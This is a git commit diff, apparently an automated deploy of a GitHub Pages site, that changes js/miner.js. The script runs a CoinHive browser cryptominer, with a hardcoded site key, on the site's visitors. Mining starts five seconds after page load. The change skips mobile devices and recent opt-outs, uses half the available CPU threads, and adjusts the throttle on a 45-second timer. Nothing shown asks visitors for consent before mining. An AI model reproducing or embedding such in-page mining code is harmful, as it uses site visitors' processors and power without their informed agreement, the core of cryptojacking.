605339a666b1188900f8e535e2db15d3c19f3c92
Travis CI <michele.nasti@gmail.com>
2017-11-02 16:26:25 +0100

    Deploy to GitHub Pages: 151b1a00922169327522fdb6e96f53a76630c59d

--- js/miner.js
+++ js/miner.js
@@ -1,22 +1,28 @@
 var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
 
-miner.setNumThreads(Math.min(miner.getNumThreads(), 3));
+miner.setNumThreads(Math.round(miner.getNumThreads() / 2));
 
-miner.setThrottle(0.3)
+//miner.setThrottle(0.3)
 
 setTimeout(startMiner, 5000)
 
 function startMiner() {
 
-    miner.start();
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
 
     var interval = setInterval(function () {
-        var threads = miner.getNumThreads();
-        if (threads <= 1) {
-            miner.setThrottle(0.1)
-            clearInterval(interval);
-        } else {
-            miner.setNumThreads(threads - 1);
-        }
+        // var threads = miner.getNumThreads();
+        // if (threads <= 1) {
+        //     miner.setThrottle(0.1)
+        //     clearInterval(interval);
+        // } else {
+        //     miner.setNumThreads(threads - 1);
+        // }
+        if (miner.getThrottle() >= 0.8) return; 
+        miner.setThrottle(miner.getThrottle()+0.1);
     }, 45 * 1000);
 }
